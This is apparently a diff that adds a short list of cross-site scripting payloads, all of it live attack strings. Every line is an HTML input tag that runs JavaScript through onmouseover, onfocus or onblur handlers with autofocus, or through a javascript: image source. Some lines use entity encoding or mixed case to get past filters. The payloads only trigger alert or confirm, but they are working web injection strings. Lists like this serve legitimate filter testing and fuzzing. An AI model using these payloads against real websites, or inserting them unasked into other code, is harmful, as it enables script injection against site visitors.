@@ -1,0 +1,5 @@
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
